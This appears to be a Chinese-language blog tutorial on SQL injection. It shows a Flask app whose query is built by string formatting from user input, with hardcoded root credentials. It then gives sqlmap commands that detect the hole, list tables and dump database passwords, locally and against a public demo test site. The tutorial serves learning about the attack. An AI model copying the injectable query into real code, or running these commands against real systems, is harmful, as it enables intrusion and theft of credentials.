---
title: SQL注入获取网站数据库密码
date: 2023-08-02 16:19:41
---

# 测试案例

Flask Web框架

```python
from flask import Flask, request
import pymysql

app = Flask(__name__)

# 配置数据库连接信息
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = '123456'
app.config['MYSQL_DB'] = 'test'
app.config['MYSQL_CURSORCLASS'] = 'DictCursor'  # 使用DictCursor返回字典类型的结果

# 创建MySQL连接
mysql = pymysql.connect(
    host=app.config['MYSQL_HOST'],
    user=app.config['MYSQL_USER'],
    password=app.config['MYSQL_PASSWORD'],
    db=app.config['MYSQL_DB'],
    cursorclass=pymysql.cursors.DictCursor
)

# 在视图函数中执行SQL查询
@app.route('/', methods=['GET'])
def index():
    username = request.args.get('username')
    cursor = mysql.cursor()
    sql = "SELECT * FROM t_user WHERE name = %s" % username
    print(sql)
    cursor.execute(sql)
    results = cursor.fetchall()
    cursor.close()
    return str(results)

if __name__ == '__main__':
    app.run()

```

# 脚本

https://github.com/sqlmapproject/sqlmap

正常查询

![image-20230802162331386](http://cxy-csx.top/image-20230802162331386.png)

在项目目录下执行命令

```
python sqlmap.py -u http://127.0.0.1:5000/?username=1 --batch
```

![image-20230802162442372](http://cxy-csx.top/image-20230802162442372.png)

注入风险

# 获取网站数据库表

```
python sqlmap.py -u http://127.0.0.1:5000/?username=1 --tables
```

![image-20230802162628070](http://cxy-csx.top/image-20230802162628070.png)

# 获取数据库密码

```
python sqlmap.py -u http://127.0.0.1:5000/?username=1 --password
```

![image-20230802162746674](http://cxy-csx.top/image-20230802162746674.png)

# 靶向网站

http://testphp.vulnweb.com/artists.php?artist=1

![image-20230802174448614](http://cxy-csx.top/image-20230802174448614.png)

数据库

![image-20230802174415017](http://cxy-csx.top/image-20230802174415017.png)

用户表数据

![image-20230802180221573](http://cxy-csx.top/image-20230802180221573.png)
